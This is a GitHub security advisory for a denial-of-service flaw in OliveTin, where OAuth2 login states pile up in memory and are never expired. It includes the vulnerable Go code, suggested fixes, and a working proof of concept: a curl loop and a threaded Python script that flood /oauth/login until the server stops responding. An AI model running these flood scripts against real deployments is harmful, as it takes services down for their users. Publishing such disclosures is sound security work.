# [H] OliveTin: Unauthenticated DoS via OAuth2 State Memory Exhaustion (Unbounded Map Growth)

## Summary
Severity: High
Advisory: GHSA-xpxj-f2fm-rqch
CVE: CVE-2026-67437
CWE: CWE-400, CWE-401, CWE-770
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-07-30
Source: https://github.com/advisories/GHSA-xpxj-f2fm-rqch
Type: github-advisory

## Affected
- Go: `github.com/OliveTin/OliveTin` — affected >=0.0.0-20251024001301-45f9c18bc3ee <0.0.0-20260708075951-ec114e95d297

## Details
## Summary

OliveTin's OAuth2 login handler stores per-login state in an in-memory map (`registeredStates`) that grows unboundedly. States are added on every `/oauth/login` request but are **never deleted or expired**. An unauthenticated attacker can send millions of requests to `/oauth/login` to fill the map with state entries, exhausting server memory and causing a denial of service.

This is **distinct from CVE-2026-28789** (concurrent map writes crash). That CVE was about the panic from unsynchronized map access — the fix added a `sync.RWMutex`. This vulnerability is about the **unbounded growth** of the map even WITH the mutex, as no cleanup mechanism exists.

## Affected Versions

- All versions with OAuth2 support, including >= 3000.10.3 (which patched CVE-2026-28789)

## Details

In `service/internal/auth/otoauth2/restapi_auth_oauth2.go`:

```go
type OAuth2Handler struct {
    cfg                 *config.Config
    mu                  sync.RWMutex
    registeredStates    map[string]*oauth2State  // NEVER cleaned up
    registeredProviders map[string]*oauth2.Config
}
```

The `HandleOAuthLogin` handler adds a new state on every request:

```go
func (h *OAuth2Handler) HandleOAuthLogin(w http.ResponseWriter, r *http.Request) {
    state, _ := randString(16)  // 24-byte base64 string
    // ...
    h.mu.Lock()
    h.registeredStates[state] = &oauth2State{
        providerConfig: provider,
        providerName:   providerName,
        Username:       "",
    }
    h.mu.Unlock()
    // ... redirect to OAuth2 provider
}
```

The `HandleOAuthCallback` handler updates existing states but never removes them:

```go
func (h *OAuth2Handler) HandleOAuthCallback(w http.ResponseWriter, r *http.Request) {
    // ...
    h.mu.Lock()
    h.registeredStates[state].Username = userinfo.Username  // Updates, never deletes
    h.registeredStates[state].Usergroup = ...
    h.mu.Unlock()
}
```

There is **no TTL, no expiry check, no periodic cleanup, and no max size limit** on `registeredStates`.

### Memory Impact Per State

Each map entry consists of:
- Key: ~24 bytes (base64 string)
- Value: `*oauth2State` struct containing:
  - `providerConfig *oauth2.Config` (pointer, 8 bytes + shared config)
  - `providerName string` (~8-16 bytes)
  - `Username string` (empty initially)
  - `Usergroup string` (empty initially)
- Go map overhead: ~100-150 bytes per entry

Estimated: **~200 bytes per state entry**

At 1 million states ≈ **200 MB** of memory consumed.
At 10 million states ≈ **2 GB** of memory consumed.

### Attack Vector

The `/oauth/login` endpoint is publicly accessible (unauthenticated). Each request is lightweight (no heavy computation like argon2). The server writes a cookie and returns a 302 redirect. An attacker can send thousands of requests per second.

## PoC

### Prerequisites

- OliveTin instance with at least one OAuth2 provider configured
- Network access to `/oauth/login`

### Config

```yaml
listenAddressSingleHTTPFrontend: 0.0.0.0:1337
logLevel: "INFO"
checkForUpdates: false

authOAuth2RedirectUrl: "http://127.0.0.1:1337/oauth/callback"
authOAuth2Providers:
  github:
    clientId: "test-client-id"
    clientSecret: "test-client-secret"

actions:
  - title: noop
    shell: echo "ok"
```

### Step 1: Baseline health check

```bash
curl -i http://127.0.0.1:1337/readyz
# Expected: 200 OK

curl -I "http://127.0.0.1:1337/oauth/login?provider=github"
# Expected: 302 Found (redirect to GitHub)
```

### Step 2: Flood with state-creation requests

```bash
# Each request creates a new map entry that is never cleaned up
for i in $(seq 1 100000); do
  curl -s -o /dev/null "http://127.0.0.1:1337/oauth/login?provider=github" &
  # Throttle to avoid connection limits
  if (( i % 500 == 0 )); then
    wait
    echo "Sent $i requests..."
  fi
done
wait
echo "Flood complete"
```

### Step 3: Python PoC for sustained memory exhaustion

```python
#!/usr/bin/env python3
"""PoC: OAuth2 State Memory Exhaustion DoS

Distinct from CVE-2026-28789 (concurrent map crash).
This exploits unbounded growth of the registeredStates map.
"""

import requests
import time
import sys
from concurrent.futures import ThreadPoolExecutor

TARGET = "http://127.0.0.1:1337"
PROVIDER = "github"
WORKERS = 50
TOTAL_REQUESTS = 500000
BATCH_SIZE = 1000

def create_state(_):
    """Send /oauth/login to create a new state entry."""
    try:
        requests.get(
            f"{TARGET}/oauth/login?provider={PROVIDER}",
            allow_redirects=False,
            timeout=5
        )
        return True
    except Exception:
        return False

def check_health():
    """Check if the server is still responsive."""
    try:
        r = requests.get(f"{TARGET}/readyz", timeout=5)
        return r.status_code == 200
    except Exception:
        return False

print(f"[*] Target: {TARGET}")
print(f"[*] Provider: {PROVIDER}")
print(f"[*] Total requests: {TOTAL_REQUESTS}")
print(f"[*] Workers: {WORKERS}")
print()

if not check_health():
    print("[!] Server not reachable")
    sys.exit(1)

start_time = time.time()
total_created = 0

with ThreadPoolExecutor(max_workers=WORKERS) as executor:
    for batch_start in range(0, TOTAL_REQUESTS, BATCH_SIZE):
        batch_end = min(batch_start + BATCH_SIZE, TOTAL_REQUESTS)
        results = list(executor.map(create_state, range(batch_start, batch_end)))
        total_created += sum(results)

        elapsed = time.time() - start_time
        rate = total_created / elapsed if elapsed > 0 else 0
        est_memory = total_created * 200 / 1024 / 1024  # MB

        print(f"  States created: {total_created:>8} | "
              f"Rate: {rate:>6.0f}/s | "
              f"Est. memory: {est_memory:>6.1f} MB | "
              f"Healthy: {check_health()}")

        if not check_health():
            print(f"\n[!] Server became unresponsive after {total_created} states!")
            print(f"[!] Estimated memory consumed: {est_memory:.1f} MB")
            break

print(f"\n[*] Attack complete. {total_created} states created in {time.time()-start_time:.1f}s")
```

### Step 4: Verify memory growth (Docker)

```bash
docker stats olivetin-instance --no-stream
# Observe MEM USAGE growing continuously during the attack
```

## Impact

- **Who is impacted:** All OliveTin deployments with any OAuth2 provider configured
- **Attack requirements:** Unauthenticated network access to `/oauth/login`
- **Effect:** Gradual memory exhaustion leading to OOM kill or service degradation
- **Persistence:** Memory is never reclaimed (states are never deleted) even after the attack stops — a restart is required
- **Distinction from CVE-2026-28789:** That CVE was a race condition crash (concurrent map writes). This is unbounded memory growth that persists even with the mutex fix applied.

## Suggested Fix

1. Add a TTL to OAuth2 states (e.g., 15 minutes matching the cookie `MaxAge`)
2. Add a maximum state count (e.g., 10,000) with LRU eviction
3. Clean up states after successful callback
4. Add periodic garbage collection for expired states

## References
- https://github.com/OliveTin/OliveTin/security/advisories/GHSA-xpxj-f2fm-rqch
- https://nvd.nist.gov/vuln/detail/CVE-2026-67437
- https://github.com/OliveTin/OliveTin/commit/ec114e95d297b806c3ca0c37bc139b3c9c517b3f
- https://github.com/OliveTin/OliveTin
- https://github.com/OliveTin/OliveTin/releases/tag/3000.17.0
